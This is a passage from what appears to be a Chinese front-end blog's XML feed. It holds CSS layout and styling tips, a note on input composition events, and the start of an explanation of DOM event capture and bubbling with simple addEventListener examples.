src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_1.png"></p><h2 id="3-使用vw定制rem自适应布局"><a href="#3-使用vw定制rem自适应布局" class="headerlink" title="3.使用vw定制rem自适应布局"></a>3.使用vw定制rem自适应布局</h2><ul><li>要点：移动端使用<code>rem布局</code>需要通过JS设置不同屏幕宽高比的<code>font-size</code>，结合<code>vw</code>单位和<code>calc()</code>可脱离JS的控制</li><li>场景：<strong>rem页面布局</strong>(不兼容低版本移动端系统)</li><li>兼容：<a href="https://caniuse.com/#search=vw">vw</a>、<a href="https://caniuse.com/#search=calc()">calc()</a></li></ul><h2 id="4-使用writing-mode排版竖文"><a href="#4-使用writing-mode排版竖文" class="headerlink" title="4.使用writing-mode排版竖文"></a>4.使用writing-mode排版竖文</h2><ul><li>要点：通过<code>writing-mode</code>调整文本排版方向</li><li>场景：<strong>竖行文字</strong>、<strong>文言文</strong>、<strong>诗词</strong></li><li>兼容：<a href="https://caniuse.com/#search=writing-mode">writing-mode</a></li><li>代码：<a href="http://js.jirengu.com/quqon/2/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_2.png"></p><h2 id="5-使用text-align-last对齐两端文本"><a href="#5-使用text-align-last对齐两端文本" class="headerlink" title="5.使用text-align-last对齐两端文本"></a>5.使用text-align-last对齐两端文本</h2><ul><li>要点：通过<code>text-align-last:justify</code>设置文本两端对齐</li><li>场景：<strong>未知字数中文对齐</strong></li><li>兼容：<a href="hhttps://caniuse.com/#search=text-align-last">text-align-last</a></li><li>代码：<a href="http://js.jirengu.com/punim/3/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_3.png"></p><h2 id="6-使用object-fit规定图像尺寸"><a href="#6-使用object-fit规定图像尺寸" class="headerlink" title="6.使用object-fit规定图像尺寸"></a>6.使用object-fit规定图像尺寸</h2><ul><li>要点：通过<code>object-fit</code>使图像脱离<code>background-size</code>的约束，使用<code>&lt;img&gt;</code>来标记图像背景尺寸</li><li>场景：<strong>图片尺寸自适应</strong></li><li>兼容：<a href="https://caniuse.com/#search=object-fit">object-fit</a></li><li>代码：<a href="http://js.jirengu.com/maxuz/5/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_4.png"></p><h2 id="7-使用text-overflow控制文本溢出"><a href="#7-使用text-overflow控制文本溢出" class="headerlink" title="7.使用text-overflow控制文本溢出"></a>7.使用text-overflow控制文本溢出</h2><ul><li>要点：通过<code>text-overflow:ellipsis</code>对溢出的文本在末端添加<code>...</code></li><li>场景：<strong>单行文字溢出</strong>、<strong>多行文字溢出</strong></li><li>兼容：<a href="https://caniuse.com/#search=text-overflow">text-overflow</a>、<a href="https://caniuse.com/#search=line-clamp">line-clamp</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/box-orient">box-orient</a></li><li>代码：<a href="http://js.jirengu.com/vituj/4/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_5.png"></p><h2 id="8-使用letter-spacing排版倒序文本"><a href="#8-使用letter-spacing排版倒序文本" class="headerlink" title="8.使用letter-spacing排版倒序文本"></a>8.使用letter-spacing排版倒序文本</h2><ul><li>要点：通过<code>letter-spacing</code>设置负值字体间距将文本倒序</li><li>场景：<strong>文言文</strong>、<strong>诗词</strong></li><li>兼容：<a href="https://caniuse.com/#search=letter-spacing">letter-spacing</a></li><li>代码：<a href="http://js.jirengu.com/vurer/1/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_6.png"></p><h2 id="9-使用margin-left排版左重右轻列表"><a href="#9-使用margin-left排版左重右轻列表" class="headerlink" title="9.使用margin-left排版左重右轻列表"></a>9.使用margin-left排版左重右轻列表</h2><ul><li>要点：使用<code>flexbox横向布局</code>时，最后一个元素通过<code>margin-left:auto</code>实现向右对齐</li><li>场景：<strong>右侧带图标的导航栏</strong></li><li>兼容：<a href="https://caniuse.com/#search=margin">margin</a></li><li>代码：<a href="http://js.jirengu.com/nocuh/3/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_7.png"></p><h2 id="10-使用overflow-scrolling支持弹性滚动"><a href="#10-使用overflow-scrolling支持弹性滚动" class="headerlink" title="10.使用overflow-scrolling支持弹性滚动"></a>10.使用overflow-scrolling支持弹性滚动</h2><ul><li>要点：iOS页面非 <code>body</code> 元素的滚动操作会非常卡( <code>Android</code> 不会出现此情况)，通过 <code>overflow-scrolling:touch</code> 调用 <code>Safari</code> 原生滚动来支持弹性滚动，增加页面滚动的流畅度</li><li>场景：iOS页面滚动</li><li>兼容：iOS自带 <code>-webkit-overflow-scrolling</code><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">overflow</span>-scrolling: touch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.elem</span> &#123;</span><br><span class="line">    <span class="attribute">overflow</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="11-使用transform启动GPU硬件加速"><a href="#11-使用transform启动GPU硬件加速" class="headerlink" title="11.使用transform启动GPU硬件加速"></a>11.使用transform启动GPU硬件加速</h2><ul><li>要点：有时执行动画可能会导致页面卡顿，可在特定元素中使用硬件加速来避免这个问题</li><li>场景：<strong>动画元素</strong>(绝对定位、同级中超过6个以上使用动画)</li><li>兼容：<a href="https://caniuse.com/#search=transform">transform</a><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* translateZ(0)亦可 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="12-使用pointer-events禁用事件触发"><a href="#12-使用pointer-events禁用事件触发" class="headerlink" title="12.使用pointer-events禁用事件触发"></a>12.使用pointer-events禁用事件触发</h2><ul><li>要点：通过<code>pointer-events:none</code>禁用事件触发(默认事件、冒泡事件、鼠标事件、键盘事件等)，相当于<code>&lt;button&gt;</code>的<code>disabled</code></li><li>场景：<strong>限时点击按钮</strong>(发送验证码倒计时)、<strong>事件冒泡禁用</strong>(多个元素重叠且自带事件、a标签跳转)</li><li>兼容：<a href="https://caniuse.com/#search=pointer-events">pointer-events</a></li><li>代码：<a href="http://js.jirengu.com/mebum/5/edit?html,css,js,output">在线演示</a></li></ul><h2 id="13-使用-valid和-invalid校验表单"><a href="#13-使用-valid和-invalid校验表单" class="headerlink" title="13.使用:valid和:invalid校验表单"></a>13.使用:valid和:invalid校验表单</h2><ul><li>要点：<code>&lt;input&gt;</code>使用伪类<code>:valid</code>和<code>:invalid</code>配合<code>pattern</code>校验表单输入的内容</li><li>场景：<strong>表单校验</strong></li><li>兼容：<a href="https://caniuse.com/#search=pattern">pattern</a>、<a href="https://caniuse.com/#search=%3Avalid">:valid</a>、<a href="https://caniuse.com/#search=%3Ainvalid">:invalid</a></li><li>代码：<a href="http://js.jirengu.com/pexah/6/edit?html,css,output">在线演示</a></li></ul><h2 id="14-使用-focus-within分发冒泡响应"><a href="#14-使用-focus-within分发冒泡响应" class="headerlink" title="14.使用:focus-within分发冒泡响应"></a>14.使用:focus-within分发冒泡响应</h2><ul><li>要点：表单控件触发<code>focus</code>和<code>blur</code>事件后往父元素进行冒泡，在父元素上通过<code>:focus-within</code>捕获该冒泡事件来设置样式</li><li>场景：<strong>登录注册弹框</strong>、<strong>表单校验</strong>、<a href="https://link.juejin.im/?target=https://codepen.io/dannievinther/pen/NvZjvz"><strong>离屏导航</strong></a>、<a href="https://link.juejin.im/?target=https://codepen.io/Chokcoco/pen/RJEpaP"><strong>导航切换</strong></a></li><li>兼容：<a href="https://www.caniuse.com/#search=%3Afocus-within">:focus-within</a>、<a href="https://www.caniuse.com/#search=%3Aplaceholder-shown">:placeholder-shown</a></li><li>代码：<a href="http://js.jirengu.com/cafah/2/edit?html,css,output">在线演示</a></li></ul><h2 id="15-使用color改变边框颜色"><a href="#15-使用color改变边框颜色" class="headerlink" title="15.使用color改变边框颜色"></a>15.使用color改变边框颜色</h2><ul><li>要点：<code>border</code>没有定义<code>border-color</code>时，设置<code>color</code>后，<code>border-color</code>会被定义成<code>color</code></li><li>场景：<strong>边框颜色与文字颜色相同</strong></li><li>兼容：<a href="https://caniuse.com/#search=color">color</a><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.elem</span> &#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#f66</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="16-使用filter开启悼念模式"><a href="#16-使用filter开启悼念模式" class="headerlink" title="16.使用filter开启悼念模式"></a>16.使用filter开启悼念模式</h2><ul><li>要点：通过<code>filter:grayscale()</code>设置灰度模式来悼念某位去世的仁兄或悼念因灾难而去世的人们</li><li>场景：<strong>网站悼念</strong></li><li>兼容：<a href="https://caniuse.com/#search=filter">filter</a></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line"><span class="attribute">filter</span>: <span class="built_in">grayscale</span>(<span class="number">100%</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_8.png"></p><h2 id="17-使用-selection改变文本选择颜色"><a href="#17-使用-selection改变文本选择颜色" class="headerlink" title="17.使用::selection改变文本选择颜色"></a>17.使用::selection改变文本选择颜色</h2><ul><li>要点：通过<code>::selection</code>根据主题颜色自定义文本选择颜色</li><li>场景：<strong>主题化</strong></li><li>兼容：<a href="https://caniuse.com/#search=%3A%3Aselection">::selection</a></li><li>代码：<a href="http://js.jirengu.com/nitix/2/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img.webp"></p><h2 id="18-使用linear-gradient控制文本渐变"><a href="#18-使用linear-gradient控制文本渐变" class="headerlink" title="18.使用linear-gradient控制文本渐变"></a>18.使用linear-gradient控制文本渐变</h2><ul><li>要点：通过<code>linear-gradient</code>设置背景渐变色，配合<code>background-clip:text</code>对背景进行文本裁剪，添加滤镜动画</li><li>场景：<strong>主题化</strong>、<strong>特色标题</strong></li><li>兼容：<a href="https://caniuse.com/#search=gradient">gradient</a>、<a href="https://www.caniuse.com/#search=background-clip">background-clip</a>、<a href="https://caniuse.com/#search=filter">filter</a>、<a href="https://www.caniuse.com/#search=animation">animation</a>、<a href="https://www.caniuse.com/#search=text-fill-color">text-fill-color</a></li><li>代码：<a href="http://js.jirengu.com/jireg/3/">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_1.webp"></p><h2 id="19-使用transform模拟视差滚动"><a href="#19-使用transform模拟视差滚动" class="headerlink" title="19.使用transform模拟视差滚动"></a>19.使用transform模拟视差滚动</h2><ul><li>要点：通过<code>background-attachment:fixed</code>或<code>transform</code>让多层背景以不同的速度移动，形成立体的运动效果</li><li>场景：<a href="https://codepen.io/Chokcoco/pen/JBaQoY"><strong>页面滚动</strong></a>、<a href="https://codepen.io/Chokcoco/pen/XBgBBp"><strong>视差滚动文字阴影</strong></a>、<a href="https://codepen.io/Chokcoco/pen/PBXwdX"><strong>视差滚动文字虚影</strong></a></li><li>兼容：<a href="https://www.caniuse.com/#search=background-attachment">background-attachment</a>、<a href="https://www.caniuse.com/#search=transform">transform</a></li><li>代码：<a href="https://codepen.io/melonxx/pen/LYPOMNj">在线演示</a></li></ul><h2 id="20-使用linear-gradient控制背景渐变"><a href="#20-使用linear-gradient控制背景渐变" class="headerlink" title="20.使用linear-gradient控制背景渐变"></a>20.使用linear-gradient控制背景渐变</h2><ul><li>要点：通过<code>linear-gradient</code>设置背景渐变色并放大背景尺寸，添加背景移动效果</li><li>场景：<strong>主题化</strong>、<strong>彩虹背景墙</strong></li><li>兼容：<a href="https://caniuse.com/#search=gradient">gradient</a>、<a href="https://www.caniuse.com/#search=animation">animation</a></li><li>代码：<a href="http://js.jirengu.com/sacol/2/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_2.webp"></p><h2 id="21-使用animation-delay保留动画起始帧"><a href="#21-使用animation-delay保留动画起始帧" class="headerlink" title="21.使用animation-delay保留动画起始帧"></a>21.使用animation-delay保留动画起始帧</h2><ul><li>要点：通过<code>transform-delay</code>或<code>animation-delay</code>设置负值时延保留动画起始帧，让动画进入页面不用等待即可运行</li><li>场景：<strong>开场动画</strong></li><li>兼容：<a href="https://www.caniuse.com/#search=transform">transform</a>、<a href="https://www.caniuse.com/#search=animation">animation</a></li><li>代码：<a href="http://js.jirengu.com/geyol/4/edit?html,css,output">在线演示</a><br><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_3.webp"></li></ul><h2 id="22-使用caret-color改变光标颜色"><a href="#22-使用caret-color改变光标颜色" class="headerlink" title="22.使用caret-color改变光标颜色"></a>22.使用caret-color改变光标颜色</h2><ul><li>要点：通过<code>caret-color</code>根据主题颜色自定义光标颜色</li><li>场景：<strong>主题化</strong></li><li>兼容：<a href="https://caniuse.com/#search=caret-color">caret-color</a></li><li>代码：<a href="http://js.jirengu.com/ribag/3/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_9.png"></p><h2 id="23-使用box-shadow裁剪图像"><a href="#23-使用box-shadow裁剪图像" class="headerlink" title="23.使用box-shadow裁剪图像"></a>23.使用box-shadow裁剪图像</h2><ul><li>要点：通过<code>box-shadow</code>模拟蒙层实现中间镂空</li><li>场景：<strong>图片裁剪</strong>、<strong>新手引导</strong>、<strong>背景镂空</strong>、<strong>投射定位</strong></li><li>兼容：<a href="https://caniuse.com/#search=box-shadow">box-shadow</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/zYONxRG">在线演示</a></li></ul><h2 id="24-滚动指示器"><a href="#24-滚动指示器" class="headerlink" title="24.滚动指示器"></a>24.滚动指示器</h2><ul><li>要点：提示滚动进度的指示器</li><li>场景：<a href="https://codepen.io/MadeByMike/pen/ZOrEmr"><strong>阅读进度</strong></a></li><li>兼容：<a href="https://caniuse.com/#search=calc()">calc()</a>、<a href="https://caniuse.com/#search=gradient">gradient</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/ExYPMog">在线演示</a></li></ul><h2 id="25-换色器"><a href="#25-换色器" class="headerlink" title="25.换色器"></a>25.换色器</h2><ul><li>要点：通过拾色器改变图像色相的换色器</li><li>场景：<strong>图片色彩变换</strong></li><li>兼容：<a href="https://www.caniuse.com/#search=mix-blend-mode">mix-blend-mode</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/vYBLqBm">在线演示</a></li></ul><h2 id="26-倒影加载条"><a href="#26-倒影加载条" class="headerlink" title="26.倒影加载条"></a>26.倒影加载条</h2><ul><li>要点：带有渐变倒影的加载条</li><li>场景：<strong>加载提示</strong></li><li>兼容：<a href="https://caniuse.com/#search=box-reflect">box-reflect</a>、<a href="https://www.caniuse.com/#search=animation">animation</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/GRKZzpg">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_4.webp"></p><h2 id="27-动态边框"><a href="#27-动态边框" class="headerlink" title="27.动态边框"></a>27.动态边框</h2><ul><li>要点：鼠标悬浮时动态渐变显示的边框</li><li>场景：<strong>悬浮按钮</strong>、<strong>边框动画</strong></li><li>兼容：<a href="https://caniuse.com/#search=gradient">gradient</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/qBWZPvE">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_5.webp"></p><h2 id="28-立体按钮"><a href="#28-立体按钮" class="headerlink" title="28.立体按钮"></a>28.立体按钮</h2><ul><li>要点：点击呈现按下状态的按钮</li><li>场景：<strong>按钮点击</strong></li><li>兼容：<a href="https://caniuse.com/#search=box-shadow">box-shadow</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/PoYpaLL">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img_6.webp"></p><h2 id="29-自适应相册"><a href="#29-自适应相册" class="headerlink" title="29.自适应相册"></a>29.自适应相册</h2><ul><li>要点：自适应照片数量的相册</li><li>场景：<strong>九宫格相册</strong>、<strong>微信相册</strong>、<strong>图集</strong></li><li>兼容：<a href="https://caniuse.com/#search=%3Aonly-child">:only-child</a>、<a href="https://caniuse.com/#search=%3Afirst-child">:first-child</a>、<a href="https://caniuse.com/#search=%3Anth-child()">:nth-child()</a>、<a href="https://caniuse.com/#search=%3Anth-last-child()">:nth-last-child()</a>、<a href="https://caniuse.com/#search=~">~</a></li><li>代码：<a href="https://codepen.io/JowayYoung/pen/pozNGyj">在线演示</a></li><li>代码：<a href="http://js.jirengu.com/yiveh/5/edit?html,css,output">在线演示</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>input-事件compositionstart、compositionupdate、compositionend</title>
      <link href="/Blog/2019/11/21/essay/input-%E4%BA%8B%E4%BB%B6compositionstart%E3%80%81compositionupdate%E3%80%81compositionend/index/"/>
      <url>/Blog/2019/11/21/essay/input-%E4%BA%8B%E4%BB%B6compositionstart%E3%80%81compositionupdate%E3%80%81compositionend/index/</url>
      
        <content type="html"><![CDATA[<h3 id="compositionstart"><a href="#compositionstart" class="headerlink" title="compositionstart"></a>compositionstart</h3><blockquote><p>事件触发于一段文字的输入之前（类似于 keydown 事件，但是该事件仅在若干可见字符的输入之前，而这些可见字符的输入可能需要一连串的键盘操作、语音识别或者点击输入法的备选词）。</p></blockquote><h3 id="compositionupdate"><a href="#compositionupdate" class="headerlink" title="compositionupdate"></a>compositionupdate</h3><blockquote><p>事件触发于字符被输入到一段文字的时候（这些可见字符的输入可能需要一连串的键盘操作、语音识别或者点击输入法的备选词）</p></blockquote><h3 id="compositionend"><a href="#compositionend" class="headerlink" title="compositionend"></a>compositionend</h3><blockquote><p>当文本段落的组成完成或取消时, compositionend 事件将被触发 (具有特殊字符的触发, 需要一系列键和其他输入, 如语音识别或移动中的字词建议)。</p></blockquote><hr><blockquote><p>经测试该三种事件，仅在<strong>输入法</strong>中触发。</p></blockquote><h2 id="对比-keydown、input、keyup-事件，产生的顺序"><a href="#对比-keydown、input、keyup-事件，产生的顺序" class="headerlink" title="对比 keydown、input、keyup 事件，产生的顺序"></a>对比 keydown、input、keyup 事件，产生的顺序</h2><p><img src="/Blog/2019/11/21/essay/input-%E4%BA%8B%E4%BB%B6compositionstart%E3%80%81compositionupdate%E3%80%81compositionend/index/img.webp"></p><p><img src="/Blog/2019/11/21/essay/input-%E4%BA%8B%E4%BB%B6compositionstart%E3%80%81compositionupdate%E3%80%81compositionend/index/img.png" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DOM事件之【捕获，冒泡】</title>
      <link href="/Blog/2019/10/31/essay/DOM%E4%BA%8B%E4%BB%B6%E4%B9%8B%E3%80%90%E6%8D%95%E8%8E%B7%EF%BC%8C%E5%86%92%E6%B3%A1%E3%80%91/index/"/>
      <url>/Blog/2019/10/31/essay/DOM%E4%BA%8B%E4%BB%B6%E4%B9%8B%E3%80%90%E6%8D%95%E8%8E%B7%EF%BC%8C%E5%86%92%E6%B3%A1%E3%80%91/index/</url>
      
        <content type="html"><![CDATA[<p>先不说【捕捉，冒泡】是什么东西（概念）</p><h5 id="首先我们来看一段代码"><a href="#首先我们来看一段代码" class="headerlink" title="首先我们来看一段代码"></a>首先我们来看<a href="http://js.jirengu.com/quruy/2/edit?html,js,console,output">一段代码</a></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// html</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;grand&quot;</span>&gt;</span></span><br><span class="line">  爷爷</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;father&quot;</span>&gt;</span></span><br><span class="line">    爸爸</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;son&quot;</span>&gt;</span></span><br><span class="line">      儿子</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js</span></span><br><span class="line">grand.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fn1&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">father.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fn2&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">son.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fn3&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="当我们鼠标点击儿子时，触发的事件顺序究竟是什么样的呢？"><a href="#当我们鼠标点击儿子时，触发的事件顺序究竟是什么样的呢？" class="headerlink" title="当我们鼠标点击儿子时，触发的事件顺序究竟是什么样的呢？"></a>当我们鼠标点击儿子时，触发的事件顺序究竟是什么样的呢？</h5><p>1、</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f<span class="symbol">n3</span></span><br><span class="line">f<span class="symbol">n2</span></span><br><span class="line">f<span class="symbol">n1</span></span><br></pre></td></tr></table></figure><p>2、</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f<span class="symbol">n1</span></span><br><span class="line">f<span class="symbol">n2</span></span><br><span class="line">f<span class="symbol">n3</span></span><br></pre></td></tr></table></figure><h5 id="一试便知，是第一种-fn3-gt-fn2-gt-fn1-。"><a href="#一试便知，是第一种-fn3-gt-fn2-gt-fn1-。" class="headerlink" title="一试便知，是第一种 fn3=&gt;fn2=&gt;fn1 。"></a>一试便知，是第一种 <code>fn3=&gt;fn2=&gt;fn1</code> 。</h5><p>通过查阅 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener">MDN</a> ，我们可以使用第三个参数，默认为 <code>falsy</code></p><blockquote><p>1、所以当我们<a href="http://js.jirengu.com/quruy/2/edit?html,js,console,output">如下写法</a>时：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grand.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn1&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">father.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn2&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">son.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn3&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>结果为 <code>fn3=&gt;fn2=&gt;fn1</code></p></blockquote><blockquote><p>2、所以当我们<a href="http://js.jirengu.com/depoj/3/edit?html,js,console,output">如下写法</a>时：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grand.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn1&#x27;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">father.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn2&#x27;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">son.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;fn3&#x27;</span>)</span><br><span class="line">&#125;, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>结果为 <code>fn1=&gt;fn2=&gt;fn3</code></p></blockquote><h4 id="接下来我们就可以来说说【捕获，冒泡】"><a 